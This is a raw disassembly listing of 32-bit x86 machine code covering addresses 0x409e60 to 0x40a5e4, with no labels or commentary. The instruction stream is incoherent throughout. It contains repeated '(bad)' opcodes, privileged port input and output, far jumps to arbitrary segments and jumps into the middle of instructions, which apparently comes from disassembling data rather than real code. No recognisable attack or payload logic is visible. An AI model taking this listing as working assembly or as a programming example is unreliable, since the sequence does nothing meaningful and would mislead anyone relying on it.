  409e60:	int    0xfc
  409e62:	mov    cl,0x78
  409e64:	jns    0x409ea4
  409e66:	push   ss
  409e67:	sub    eax,0xe346d6b1
  409e6c:	js     0x409e6b
  409e6e:	jns    0x409e01
  409e70:	cmc    
  409e71:	sti    
  409e72:	outs   dx,DWORD PTR ds:[esi]
  409e73:	jnp    0x409e87
  409e75:	xchg   esp,eax
  409e76:	xchg   ebx,eax
  409e77:	inc    esp
  409e78:	ins    BYTE PTR es:[edi],dx
  409e79:	ficomp WORD PTR [edx+0xe3c715a]
  409e7f:	inc    esi
  409e80:	mov    WORD PTR [ebx],es
  409e82:	or     al,0x89
  409e84:	push   ds
  409e85:	in     eax,0xab
  409e87:	sbb    BYTE PTR [edi+0x42],bh
  409e8a:	pop    eax
  409e8b:	jge    0x409e7a
  409e8d:	pcmpgtw mm5,QWORD PTR [esi+ecx*1+0x3efb9732]
  409e95:	mov    ds:0x3b525a49,eax
  409e9a:	in     al,0x2b
  409e9c:	rcr    BYTE PTR [edx-0x65],cl
  409e9f:	std    
  409ea0:	push   es
  409ea1:	imul   eax,DWORD PTR [ecx],0x18
  409ea4:	or     al,0x21
  409ea6:	jg     0x409e84
  409ea8:	sbb    DWORD PTR [edi-0x7bc08ded],0xcb3af523
  409eb2:	mov    gs,WORD PTR [esi-0x4c]
  409eb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eb6:	int    0x8
  409eb8:	and    BYTE PTR [ebp-0x58],0xeb
  409ebc:	adc    eax,DWORD PTR [ecx]
  409ebe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ebf:	mov    esi,0x85d6cdda
  409ec4:	mov    bl,0xa9
  409ec6:	xchg   ebp,eax
  409ec7:	loopne 0x409f19
  409ec9:	outs   dx,BYTE PTR ds:[esi]
  409eca:	or     DWORD PTR [esi+0x14],0xfffffff8
  409ece:	pop    esp
  409ecf:	and    edx,0x1c
  409ed2:	pop    edx
  409ed3:	mov    al,ds:0xf8d8371a
  409ed8:	xchg   ecx,eax
  409ed9:	adc    DWORD PTR [edx-0x6febb6b7],eax
  409edf:	sbb    al,0x10
  409ee1:	xchg   esp,eax
  409ee2:	dec    esi
  409ee3:	push   es
  409ee4:	inc    edx
  409ee5:	inc    ebx
  409ee6:	sahf   
  409ee7:	loope  0x409f25
  409ee9:	ins    BYTE PTR es:[edi],dx
  409eea:	mov    ch,0x16
  409eec:	push   eax
  409eed:	pop    esi
  409eee:	lods   eax,DWORD PTR ds:[esi]
  409eef:	cmp    DWORD PTR [eax-0x1b11dbe2],ebx
  409ef5:	fst    DWORD PTR [esp+ebp*8-0x71]
  409ef9:	dec    esp
  409efa:	mov    BYTE PTR [ecx+0x1c],dl
  409efd:	mov    bl,0x2b
  409eff:	je     0x409eb8
  409f01:	cmp    al,0x67
  409f03:	xchg   ebp,eax
  409f04:	mov    DWORD PTR [edx-0x2b1e6d3c],ecx
  409f0a:	daa    
  409f0b:	(bad)  
  409f0c:	mov    eax,0x75c5efa3
  409f11:	adc    esp,edi
  409f13:	xchg   edi,eax
  409f14:	xor    al,0xc0
  409f16:	adc    eax,0x8e200c97
  409f1b:	js     0x409f00
  409f1d:	push   ds
  409f1e:	xchg   edx,eax
  409f1f:	outs   dx,BYTE PTR ds:[esi]
  409f20:	dec    edx
  409f21:	jb     0x409f99
  409f23:	xacquire lock adc DWORD PTR [edi-0x15a9ef28],ebx
  409f2b:	mov    ds:0xeb739fdf,eax
  409f30:	adc    BYTE PTR [ecx],ch
  409f32:	scas   al,BYTE PTR es:[edi]
  409f33:	push   ss
  409f34:	xor    bh,BYTE PTR [ebp-0x22c40f65]
  409f3a:	sbb    edx,DWORD PTR [esi-0x593234fc]
  409f40:	jno    0x409fa2
  409f42:	mov    ebx,0x334d93de
  409f47:	push   ss
  409f48:	daa    
  409f49:	xor    ah,BYTE PTR [edi-0x6e859b97]
  409f4f:	add    al,0x9d
  409f51:	gs cmc 
  409f53:	jnp    0x409ef3
  409f55:	mov    BYTE PTR [esi],cl
  409f57:	out    dx,eax
  409f58:	inc    ebx
  409f59:	repnz xor eax,0xd3639c00
  409f5f:	jmp    0x3778:0xf1548ee8
  409f66:	(bad)  
  409f67:	pushf  
  409f68:	mov    bh,0x83
  409f6a:	and    al,0xd1
  409f6c:	in     eax,dx
  409f6d:	xor    BYTE PTR [eax-0x5fd4ecc0],al
  409f73:	mov    edx,0xe690fc26
  409f78:	xor    DWORD PTR [esp+edi*1-0x3],0xdeabc37d
  409f80:	add    DWORD PTR [ebx+0x57],ebp
  409f83:	cdq    
  409f84:	push   0x7c
  409f86:	inc    edx
  409f87:	retf   
  409f88:	imul   ebp,DWORD PTR [esp+ebp*2],0x691a8b79
  409f8f:	out    0xac,al
  409f91:	mov    al,0xfe
  409f93:	out    0xdb,eax
  409f95:	hlt    
  409f96:	push   0x472e4fb7
  409f9b:	push   ebp
  409f9c:	add    al,BYTE PTR [edi]
  409f9e:	mov    ebx,0xf415eef3
  409fa3:	jl     0x409f84
  409fa5:	popf   
  409fa6:	mov    edx,0x2ff42d8b
  409fab:	cwde   
  409fac:	xor    eax,ecx
  409fae:	push   esi
  409faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fb0:	mov    esp,0x8044809f
  409fb5:	mov    bh,0xe8
  409fb7:	mov    eax,0xc05161c
  409fbc:	int    0x53
  409fbe:	jne    0x409fb1
  409fc0:	or     eax,0x395617b0
  409fc5:	cmp    al,0x28
  409fc7:	sub    ecx,edx
  409fc9:	sub    al,0xc9
  409fcb:	jb     0x40a044
  409fcd:	les    ecx,FWORD PTR [ecx]
  409fcf:	mov    dl,0xf
  409fd1:	and    BYTE PTR [eax+0x3b],0xb8
  409fd5:	add    ch,BYTE PTR [edx]
  409fd7:	fucomp st(2)
  409fd9:	ins    DWORD PTR es:[edi],dx
  409fda:	xchg   edx,eax
  409fdb:	push   edx
  409fdc:	push   0xb92326e8
  409fe1:	fistp  WORD PTR [ebx-0x27]
  409fe4:	sbb    DWORD PTR [edi+0x1469285c],0x35
  409feb:	mov    ebx,0x96f804d6
  409ff0:	fs mov ch,0xbb
  409ff3:	jmp    0x409f96
  409ff5:	or     al,0x3b
  409ff7:	pop    esp
  409ff8:	xchg   ecx,eax
  409ff9:	add    eax,0x8502d3c6
  409ffe:	aam    0x30
  40a000:	and    eax,0x3ce110ce
  40a005:	push   ss
  40a006:	imul   esp,DWORD PTR [edx+0x5a1498ca],0x4599b7a2
  40a010:	mov    al,ds:0xd55e1ad9
  40a015:	mov    ebx,0x50d55969
  40a01a:	cld    
  40a01b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a01c:	jge    0x40a004
  40a01e:	xor    al,0x48
  40a020:	mov    bh,0x38
  40a022:	mov    al,0xac
  40a024:	or     ch,BYTE PTR [ecx+0xd15223b]
  40a02a:	jle    0x409ff9
  40a02c:	pushf  
  40a02d:	jns    0x40a092
  40a02f:	mov    ebp,0xbcbac207
  40a034:	sbb    BYTE PTR [eax],ah
  40a036:	pop    ss
  40a037:	push   ecx
  40a038:	sub    BYTE PTR [esi+edi*4],0x87
  40a03c:	jnp    0x409fde
  40a03e:	pop    esp
  40a03f:	out    dx,eax
  40a040:	pop    edi
  40a041:	mov    eax,0x348a3635
  40a046:	add    DWORD PTR [ecx],eax
  40a048:	dec    eax
  40a049:	jmp    FWORD PTR [esi-0x5d]
  40a04c:	jbe    0x40a00a
  40a04e:	add    BYTE PTR [edx],0x5e
  40a051:	mov    ds:0xf0d6a0ad,eax
  40a056:	sbb    DWORD PTR [eax+ebp*4+0x53],esi
  40a05a:	mov    eax,?
  40a05c:	push   cs
  40a05d:	in     eax,0x10
  40a05f:	in     al,dx
  40a060:	push   edx
  40a061:	xchg   ecx,eax
  40a062:	add    eax,DWORD PTR [edi+0x61872714]
  40a068:	inc    edi
  40a069:	lock push 0xa1fb2fc
  40a06f:	lea    edi,[esi-0x6a]
  40a072:	call   FWORD PTR [ebp+0x74f18642]
  40a078:	popf   
  40a079:	sub    al,BYTE PTR [eax+0x4fc1ffd9]
  40a07f:	test   al,0xe9
  40a081:	into   
  40a082:	or     DWORD PTR [edx+0x62],ebp
  40a085:	shl    DWORD PTR [eax-0x46],0x83
  40a089:	push   ebx
  40a08a:	pop    eax
  40a08b:	rol    BYTE PTR [edx+0xe],0x3f
  40a08f:	mov    esi,0xec1816b3
  40a094:	mov    DWORD PTR [eax+ecx*8-0x64],0x4ac2a39d
  40a09c:	ss cmc 
  40a09e:	mov    dl,0x97
  40a0a0:	add    eax,0x23a8e844
  40a0a5:	sar    BYTE PTR [ecx],0x49
  40a0a8:	in     eax,0x71
  40a0aa:	addr16 test ebx,ebp
  40a0ad:	sbb    DWORD PTR [ecx+0x1c7c4003],ecx
  40a0b3:	es pop ds
  40a0b5:	bound  ecx,QWORD PTR [ecx-0x384fcf3e]
  40a0bb:	jmp    0x40a063
  40a0bd:	mov    al,0x6d
  40a0bf:	jne    0x40a081
  40a0c1:	mov    eax,DWORD PTR [ebx+0x1]
  40a0c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0c5:	int    0xb5
  40a0c7:	jno    0x40a0ef
  40a0c9:	or     ebx,DWORD PTR [edx+eax*4]
  40a0cc:	mov    cs,WORD PTR [ebx+0x6f37644c]
  40a0d2:	mov    ds:0x3b294cc6,al
  40a0d7:	jne    0x40a096
  40a0d9:	mov    edx,0x5b693b66
  40a0de:	sub    edi,ebx
  40a0e0:	imul   edi,eax,0xffffffc9
  40a0e3:	scas   eax,DWORD PTR es:[edi]
  40a0e4:	push   eax
  40a0e5:	int3   
  40a0e6:	inc    eax
  40a0e7:	cmp    BYTE PTR [eax+0x31],bh
  40a0ea:	dec    edi
  40a0eb:	fdivrp st(1),st
  40a0ed:	mov    ebp,0x8932043a
  40a0f2:	jg     0x40a11d
  40a0f4:	xor    eax,0xe49d0637
  40a0f9:	pop    eax
  40a0fa:	add    ah,dl
  40a0fc:	jo     0x40a15e
  40a0fe:	cld    
  40a0ff:	jnp    0x40a102
  40a101:	and    esp,DWORD PTR [edi+0x5b]
  40a104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a105:	mov    BYTE PTR [edx-0x3d],dh
  40a108:	(bad)  
  40a109:	xor    edx,DWORD PTR [edx]
  40a10b:	test   BYTE PTR [edx],ch
  40a10d:	pop    esi
  40a10e:	add    al,0xb0
  40a110:	into   
  40a111:	jg     0x40a18b
  40a113:	lods   eax,DWORD PTR ss:[esi]
  40a115:	mov    WORD PTR [edx],?
  40a117:	imul   edx,DWORD PTR [eax+ecx*2+0xa],0x46
  40a11c:	mov    DWORD PTR [ebp+0x72276fd0],edi
  40a122:	sbb    al,0xdc
  40a124:	leave  
  40a125:	imul   edx,DWORD PTR [ebp-0x78],0x85942fd0
  40a12c:	pop    es
  40a12d:	retf   0xbf6b
  40a130:	test   eax,0x218dd796
  40a135:	or     DWORD PTR [ebx-0x6d],edx
  40a138:	imul   edx,DWORD PTR [eax+0x32],0xffffffd3
  40a13c:	lods   al,BYTE PTR ds:[esi]
  40a13d:	mov    edx,0x427fdb32
  40a142:	and    edi,eax
  40a144:	outs   dx,BYTE PTR ds:[esi]
  40a145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a146:	dec    edx
  40a147:	dec    esi
  40a148:	sbb    BYTE PTR [edx-0x14],0xce
  40a14c:	aam    0xbb
  40a14e:	adc    DWORD PTR [esi-0x63b1360],edi
  40a154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a155:	adc    BYTE PTR [eax],ah
  40a157:	xchg   ecx,eax
  40a158:	mov    al,0x60
  40a15a:	mov    esi,esp
  40a15c:	lea    ebp,[eax+0x61050b55]
  40a162:	les    ebp,FWORD PTR [ebp-0x3b]
  40a165:	add    al,0x55
  40a167:	test   eax,0x24d4613d
  40a16c:	scas   al,BYTE PTR es:[edi]
  40a16d:	adc    eax,0x633f379
  40a172:	xchg   ecx,eax
  40a173:	jmp    0x40a1b9
  40a175:	add    al,0x7d
  40a177:	retf   
  40a178:	bound  edx,QWORD PTR gs:[ebx+0x177ff4f5]
  40a17f:	pusha  
  40a180:	pop    esp
  40a181:	into   
  40a182:	push   ebx
  40a183:	and    esp,DWORD PTR [ecx+0x13e1d37]
  40a189:	test   ebp,eax
  40a18b:	scas   eax,DWORD PTR es:[edi]
  40a18c:	xchg   edi,eax
  40a18d:	mov    eax,0xbca933e0
  40a192:	jnp    0x40a1f0
  40a194:	jecxz  0x40a146
  40a196:	mov    ?,WORD PTR [eax+0xd]
  40a199:	cmp    DWORD PTR [esi],edi
  40a19b:	fcomp  QWORD PTR [edi-0x614d0f5b]
  40a1a1:	mov    dl,0xa3
  40a1a3:	fdivr  DWORD PTR [ebp-0x36ab4e73]
  40a1a9:	xor    ebx,DWORD PTR [ebx+0x183bbbfb]
  40a1af:	xor    edx,ebp
  40a1b1:	enter  0x3d85,0xc9
  40a1b5:	mov    BYTE PTR [ebx+0x5f96cf28],dl
  40a1bb:	mov    esi,0xe97e0846
  40a1c0:	rcl    ch,0x2c
  40a1c3:	jns    0x40a1d1
  40a1c5:	xchg   edx,eax
  40a1c6:	add    DWORD PTR [edi-0x448d1cb3],ebp
  40a1cc:	push   ebx
  40a1cd:	push   edi
  40a1ce:	hlt    
  40a1cf:	fmul   QWORD PTR [ebp+0x112c0a24]
  40a1d5:	sahf   
  40a1d6:	sti    
  40a1d7:	pushf  
  40a1d8:	(bad)  
  40a1d9:	xor    eax,0x7f85aceb
  40a1de:	dec    eax
  40a1df:	sti    
  40a1e0:	or     al,0xd8
  40a1e2:	mov    ds:0x2551c837,eax
  40a1e7:	out    dx,al
  40a1e8:	mov    ecx,DWORD PTR [esi]
  40a1ea:	rcr    DWORD PTR [eax],1
  40a1ec:	ds xchg esp,eax
  40a1ee:	jg     0x40a171
  40a1f0:	enter  0x705a,0x80
  40a1f4:	test   al,0xb7
  40a1f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1f7:	jo     0x40a244
  40a1f9:	test   al,0xae
  40a1fb:	ficom  WORD PTR [eax]
  40a1fd:	shr    BYTE PTR [ecx-0xd45f376],1
  40a203:	cmp    cl,al
  40a205:	xchg   esp,eax
  40a206:	jbe    0x40a209
  40a208:	cs ins BYTE PTR es:[edi],dx
  40a20a:	fnstenv [esi-0x18]
  40a20d:	sub    eax,0xad6958f2
  40a212:	shl    esi,0xb4
  40a215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a216:	jp     0x40a203
  40a218:	xor    dl,bl
  40a21a:	jnp    0x40a1b6
  40a21c:	and    BYTE PTR [eax],bh
  40a21e:	out    0x6e,eax
  40a220:	pop    ss
  40a221:	jb     0x40a296
  40a223:	call   0xf2ceae1
  40a228:	sub    ch,dh
  40a22a:	inc    ebp
  40a22b:	pop    eax
  40a22c:	jle    0x40a24c
  40a22e:	adc    BYTE PTR [esi+edx*1-0x7f],0xe
  40a233:	sub    DWORD PTR [eax+ecx*4-0x74870228],esi
  40a23a:	shl    BYTE PTR [edi-0xfb39d48],0xd8
  40a241:	dec    ebp
  40a242:	fiadd  WORD PTR [ebx-0x4d9eaa85]
  40a248:	jge    0x40a245
  40a24a:	and    eax,0x6f0db3eb
  40a24f:	jae    0x40a244
  40a251:	imul   eax,edi,0xffffff80
  40a254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a255:	pop    es
  40a256:	mov    cl,0x9a
  40a258:	add    BYTE PTR [edx],0x47
  40a25b:	cdq    
  40a25c:	loope  0x40a29d
  40a25e:	or     al,0xc7
  40a260:	mov    BYTE PTR [ecx],ah
  40a262:	and    BYTE PTR [esi+0x6902ab72],0x9f
  40a269:	dec    ebx
  40a26a:	mov    ch,0xe9
  40a26c:	jmp    0x69610a7f
  40a271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a272:	aad    0xf6
  40a274:	inc    edx
  40a275:	out    dx,al
  40a276:	(bad)  
  40a277:	jae    0x40a210
  40a279:	enter  0x4e04,0x6c
  40a27d:	ret    
  40a27e:	dec    ebp
  40a27f:	stos   BYTE PTR es:[edi],al
  40a280:	popf   
  40a281:	in     al,dx
  40a282:	push   cs
  40a283:	xor    edx,eax
  40a285:	cdq    
  40a286:	or     ecx,DWORD PTR [eax]
  40a288:	mov    ecx,0x2345e861
  40a28d:	push   esp
  40a28e:	or     al,0x6
  40a290:	add    al,0xd
  40a292:	pop    edi
  40a293:	jno    0x40a255
  40a295:	pop    esp
  40a296:	mov    ah,0xdc
  40a298:	xchg   ecx,eax
  40a299:	pop    ecx
  40a29a:	xor    ch,bh
  40a29c:	not    BYTE PTR [edx]
  40a29e:	pop    eax
  40a29f:	mov    ds:0xff9a8c18,eax
  40a2a4:	mov    edx,0x39d901c8
  40a2a9:	or     BYTE PTR [ebp+0x49f52ec6],bh
  40a2af:	lods   al,BYTE PTR gs:[esi]
  40a2b1:	add    BYTE PTR [ecx],0xec
  40a2b4:	sahf   
  40a2b5:	in     eax,0xf6
  40a2b7:	fsubr  DWORD PTR [edx+0x7]
  40a2ba:	jl     0x40a317
  40a2bc:	mov    eax,0x727e1a66
  40a2c1:	pabsd  mm1,QWORD PTR fs:[edx-0x1b6f0bce]
  40a2ca:	ins    DWORD PTR es:[edi],dx
  40a2cb:	pop    ebp
  40a2cc:	xor    eax,0x9ec13e46
  40a2d1:	in     eax,dx
  40a2d2:	jae    0x40a28d
  40a2d4:	les    edx,FWORD PTR [edi-0x6bc8ae41]
  40a2da:	mov    edi,0xc5b440c1
  40a2df:	add    eax,0x3be7fdf0
  40a2e4:	test   al,0x8c
  40a2e6:	dec    esp
  40a2e7:	test   BYTE PTR [edi+0x7f],0x28
  40a2eb:	sbb    al,0x57
  40a2ed:	jle    0x40a336
  40a2ef:	mov    cl,0x88
  40a2f1:	xor    ebx,DWORD PTR [esi]
  40a2f3:	push   cs
  40a2f4:	arpl   WORD PTR [ecx+0x1],ax
  40a2f7:	jns    0x40a32d
  40a2f9:	jecxz  0x40a31c
  40a2fb:	mov    ebx,edi
  40a2fd:	jb     0x40a2a2
  40a2ff:	rcl    esp,0xcf
  40a302:	xor    eax,0xa21da6d6
  40a307:	mov    ebp,DWORD PTR [ecx]
  40a309:	sub    esi,DWORD PTR [ecx+0x3177a7d4]
  40a30f:	jecxz  0x40a2cc
  40a311:	mov    esi,0x6618d828
  40a316:	repz mov ch,0x40
  40a319:	mov    ebx,0x5a373206
  40a31e:	dec    edx
  40a31f:	pop    ds
  40a320:	dec    edx
  40a321:	or     eax,0x1482c638
  40a326:	adc    DWORD PTR [eax-0x7f1be4d7],ecx
  40a32c:	(bad)  
  40a32d:	out    dx,al
  40a32e:	or     ebp,ecx
  40a330:	push   0x77863a1f
  40a335:	xchg   BYTE PTR [edx+0x3],bh
  40a338:	pop    edx
  40a339:	in     eax,0xee
  40a33b:	jge    0x40a303
  40a33d:	pop    es
  40a33e:	stc    
  40a33f:	adc    BYTE PTR [ebp+0x2d],cl
  40a342:	shl    DWORD PTR [esi-0x15],1
  40a345:	sub    DWORD PTR [ebx-0x65],eax
  40a348:	mov    esp,0xea42a8d7
  40a34d:	inc    edi
  40a34e:	cdq    
  40a34f:	xor    BYTE PTR [edi],0xd5
  40a352:	fwait
  40a353:	in     eax,dx
  40a354:	xchg   DWORD PTR [ebx],edi
  40a356:	lods   eax,DWORD PTR ds:[esi]
  40a357:	test   DWORD PTR [edi+0x6b9b621f],esp
  40a35d:	js     0x40a304
  40a35f:	inc    esp
  40a360:	jmp    esi
  40a362:	data16 cmp BYTE PTR [edi-0x3cbf567b],al
  40a369:	sub    ebp,esp
  40a36b:	repnz mov DWORD PTR [ebx-0x5e],edi
  40a36f:	jle    0x40a338
  40a371:	adc    eax,0x4f20fd58
  40a376:	mov    al,0xe5
  40a378:	and    bl,dh
  40a37a:	push   esp
  40a37b:	call   0xd51c:0x51ce583f
  40a382:	cld    
  40a383:	and    BYTE PTR [edx+edx*1],0x1c
  40a387:	mov    ds:0xb5c5f840,eax
  40a38c:	bound  edx,QWORD PTR [edx-0x239af0e7]
  40a392:	pop    es
  40a393:	pusha  
  40a394:	mov    DWORD PTR [eax+0x77],edi
  40a397:	aas    
  40a398:	jmp    0xa5758431
  40a39d:	add    cl,0x1d
  40a3a0:	stc    
  40a3a1:	pop    ecx
  40a3a2:	or     cl,BYTE PTR [eax-0x7d]
  40a3a5:	push   ebx
  40a3a6:	repz inc esp
  40a3a8:	fcom   QWORD PTR [edi+0x3cd20e03]
  40a3ae:	mov    ds:0x92f5e279,al
  40a3b3:	sbb    dl,BYTE PTR [eax+ebx*1]
  40a3b6:	inc    eax
  40a3b7:	shl    DWORD PTR [edi+0x74],1
  40a3ba:	inc    edi
  40a3bb:	sub    al,0xe8
  40a3bd:	into   
  40a3be:	test   DWORD PTR [edx],ecx
  40a3c0:	xlat   BYTE PTR ds:[ebx]
  40a3c1:	sahf   
  40a3c2:	or     esp,edx
  40a3c4:	dec    ebx
  40a3c5:	retf   0xda2f
  40a3c8:	cld    
  40a3c9:	popf   
  40a3ca:	(bad)  
  40a3cb:	pushf  
  40a3cc:	push   ecx
  40a3cd:	sub    al,0xdd
  40a3cf:	std    
  40a3d0:	or     eax,0x8c5c7a20
  40a3d5:	mov    esp,0x9dc0f2df
  40a3da:	jno    0x40a3b2
  40a3dc:	dec    ebp
  40a3dd:	sub    BYTE PTR [ecx],ch
  40a3df:	test   DWORD PTR [edi+0x68],edi
  40a3e2:	xchg   esp,eax
  40a3e3:	fs jle 0x40a422
  40a3e6:	sbb    eax,0x651082ac
  40a3eb:	add    al,0xa7
  40a3ed:	dec    esp
  40a3ee:	xor    edx,DWORD PTR [eax]
  40a3f0:	aad    0xd5
  40a3f2:	cmp    BYTE PTR [edx-0x66],0x1b
  40a3f6:	add    dh,BYTE PTR [ebx+0x19]
  40a3f9:	and    eax,0x8d3ae08f
  40a3fe:	pop    ss
  40a3ff:	pop    ebp
  40a400:	(bad)  
  40a401:	(bad)  
  40a402:	pushfw 
  40a404:	and    BYTE PTR [esp+ecx*1+0x605c698e],0x2b
  40a40c:	test   DWORD PTR [edx],esi
  40a40e:	pop    ebx
  40a40f:	cmp    BYTE PTR [ebx+0x4784b9d3],0xdb
  40a416:	sbb    al,0x6
  40a418:	push   ss
  40a419:	xchg   ebp,eax
  40a41a:	mov    bh,0x1
  40a41c:	aaa    
  40a41d:	cmc    
  40a41e:	loop   0x40a3fa
  40a420:	lods   eax,DWORD PTR ds:[esi]
  40a421:	outs   dx,BYTE PTR ds:[esi]
  40a423:	inc    ebx
  40a424:	in     al,dx
  40a425:	xchg   DWORD PTR [ebx+edi*2-0x60a9b811],eax
  40a42c:	lods   al,BYTE PTR ds:[esi]
  40a42d:	ds and al,0x43
  40a430:	mov    ah,0xad
  40a432:	in     al,dx
  40a433:	imul   ecx,edi,0x7f8c074a
  40a439:	pop    ebx
  40a43a:	iret   
  40a43b:	jns    0x40a4a7
  40a43d:	scas   al,BYTE PTR es:[edi]
  40a43e:	inc    edi
  40a43f:	inc    edx
  40a440:	es push ebp
  40a442:	dec    ebp
  40a443:	ret    0x1b
  40a446:	push   ds
  40a447:	fstp   TBYTE PTR [eax+0x5c2da569]
  40a44d:	mov    BYTE PTR [ecx+0x41],dl
  40a450:	sbb    DWORD PTR [edi+0x0],edx
  40a453:	mov    al,ds:0x70ec510c
  40a458:	cmp    BYTE PTR es:[ecx-0x6a2968cb],0x99
  40a460:	out    0xf9,al
  40a462:	ficomp DWORD PTR [ecx-0x4a]
  40a465:	jno    0x40a415
  40a467:	inc    edi
  40a468:	inc    ebx
  40a469:	jo     0x40a488
  40a46b:	push   eax
  40a46c:	adc    al,0x87
  40a46e:	(bad)  
  40a46f:	imul   ebx,DWORD PTR [esi+0x78b86cf1],0x26
  40a476:	ins    BYTE PTR es:[edi],dx
  40a477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a478:	cld    
  40a479:	inc    eax
  40a47a:	out    0x4d,al
  40a47c:	pop    ecx
  40a47d:	dec    ecx
  40a47e:	add    ebx,DWORD PTR [esi-0x4a63ce7]
  40a484:	fimul  WORD PTR [edi+0x345ac402]
  40a48a:	scas   al,BYTE PTR es:[edi]
  40a48b:	or     BYTE PTR [edx+ebx*4-0x4],0x89
  40a490:	ds push edi
  40a492:	push   es
  40a493:	fs loopne 0x40a50e
  40a496:	jmp    0x69e7:0x6107258c
  40a49d:	imul   edx,DWORD PTR [ecx+0x5445fb8e],0x7cff4ad5
  40a4a7:	push   ds
  40a4a8:	ins    DWORD PTR es:[edi],dx
  40a4a9:	push   esp
  40a4aa:	and    ch,BYTE PTR [eax]
  40a4ac:	push   esp
  40a4ad:	cmp    esi,DWORD PTR [esi-0x51f561f6]
  40a4b3:	iret   
  40a4b4:	popa   
  40a4b5:	xor    esi,ecx
  40a4b7:	data16 cmp BYTE PTR [ecx+0x17],0xaf
  40a4bc:	lods   al,BYTE PTR ds:[esi]
  40a4bd:	cmp    ebp,DWORD PTR [ebx]
  40a4bf:	out    0x2c,eax
  40a4c1:	push   0xcb0bddcc
  40a4c6:	push   esp
  40a4c7:	pop    ds
  40a4c8:	dec    ecx
  40a4c9:	jns    0x40a547
  40a4cb:	dec    ecx
  40a4cc:	imul   DWORD PTR [edx+0x5c6fa83d]
  40a4d2:	pop    es
  40a4d3:	mov    al,0x55
  40a4d5:	sub    bh,al
  40a4d7:	std    
  40a4d8:	(bad)  [esi+0x134baa21]
  40a4de:	pop    ds
  40a4df:	out    dx,al
  40a4e0:	sub    BYTE PTR [eax+eiz*8],0xad
  40a4e4:	repz push cs
  40a4e6:	xor    al,BYTE PTR [ecx-0x73a4451f]
  40a4ec:	outs   dx,BYTE PTR ds:[esi]
  40a4ed:	in     al,dx
  40a4ee:	lods   eax,DWORD PTR ds:[esi]
  40a4ef:	imul   esi,DWORD PTR [edi-0x4ad5383e],0x3fe65eb9
  40a4f9:	inc    eax
  40a4fa:	popf   
  40a4fb:	stc    
  40a4fc:	dec    esp
  40a4fd:	sub    al,0xdd
  40a4ff:	outs   dx,DWORD PTR ds:[esi]
  40a500:	lods   al,BYTE PTR ds:[esi]
  40a501:	ret    
  40a502:	mov    al,0x8e
  40a504:	dec    edi
  40a505:	push   cs
  40a506:	js     0x40a4d3
  40a508:	dec    ebp
  40a509:	repz mov cl,0xe2
  40a50c:	jle    0x40a54d
  40a50e:	xchg   esp,eax
  40a50f:	pop    ds
  40a510:	pop    ebp
  40a511:	arpl   WORD PTR [ebx],dx
  40a513:	fst    DWORD PTR [eax-0x7185b5b1]
  40a519:	or     DWORD PTR [ebx+0x49],0x2f
  40a51d:	xchg   ebx,eax
  40a51e:	pop    eax
  40a51f:	cmp    esp,DWORD PTR [ecx-0x16bd17fa]
  40a525:	jmp    0x4d08:0x7b6c322b
  40a52c:	shl    DWORD PTR [edi],cl
  40a52e:	out    0x7,eax
  40a530:	adc    esp,DWORD PTR [edx-0x12ffb58]
  40a536:	jmp    0xbe40f9dc
  40a53b:	call   0x48b3:0xb51f5cac
  40a542:	test   al,0xe
  40a544:	int    0x28
  40a546:	or     cl,BYTE PTR [edi+0x1b]
  40a549:	int    0x6d
  40a54b:	mov    ?,WORD PTR ds:0x83deec39
  40a551:	add    eax,DWORD PTR [eax+edx*8]
  40a554:	and    eax,0x7def83b0
  40a559:	stos   BYTE PTR es:[edi],al
  40a55a:	pop    ds
  40a55b:	pop    eax
  40a55c:	daa    
  40a55d:	jecxz  0x40a547
  40a55f:	and    eax,0x5c039e2b
  40a564:	dec    esp
  40a565:	adc    eax,0xb657e8a2
  40a56a:	in     al,dx
  40a56b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a56c:	jle    0x40a5ca
  40a56e:	push   ds
  40a56f:	gs mov cl,0x98
  40a572:	daa    
  40a573:	push   esi
  40a574:	xor    ch,BYTE PTR [eax]
  40a576:	adc    edi,ebx
  40a578:	xchg   esp,eax
  40a579:	and    DWORD PTR [ebx],0xb41a70da
  40a57f:	fwait
  40a580:	lods   al,BYTE PTR ds:[esi]
  40a581:	cmp    DWORD PTR [edi-0xbd08205],ebx
  40a587:	cwde   
  40a588:	pop    esi
  40a589:	dec    esp
  40a58a:	retf   0xe3aa
  40a58d:	int    0x12
  40a58f:	mov    BYTE PTR [edi-0x1a],bh
  40a592:	lods   eax,DWORD PTR ds:[esi]
  40a593:	pop    eax
  40a594:	cmp    esp,eax
  40a596:	fdiv   QWORD PTR [esi+0x690a678f]
  40a59c:	inc    ebp
  40a59d:	mov    al,ds:0xb15bb267
  40a5a2:	(bad)  
  40a5a3:	or     DWORD PTR [ecx+ecx*2+0x3227118e],edi
  40a5aa:	dec    ebp
  40a5ab:	push   ds
  40a5ac:	push   eax
  40a5ad:	add    al,0xa2
  40a5af:	pop    edx
  40a5b0:	cmp    esi,DWORD PTR [esp+esi*8-0x3814b366]
  40a5b7:	neg    BYTE PTR [esi+0x36]
  40a5ba:	ret    
  40a5bb:	pop    es
  40a5bc:	enter  0x2edb,0xa6
  40a5c0:	in     al,dx
  40a5c1:	loop   0x40a557
  40a5c3:	xchg   edi,eax
  40a5c4:	dec    ebp
  40a5c5:	pop    ss
  40a5c6:	mov    al,ds:0xcc906869
  40a5cb:	mov    ds:0xbee1cd18,al
  40a5d0:	dec    ebp
  40a5d1:	mov    bh,0x3d
  40a5d3:	(bad)
  40a5d8:	int3   
  40a5d9:	or     eax,0x1b37deba
  40a5de:	inc    esi
  40a5df:	cld    
  40a5e0:	ja     0x40a5de
  40a5e2:	fisubr WORD PTR [esi]
  40a5e4:	jns    0x40a65d
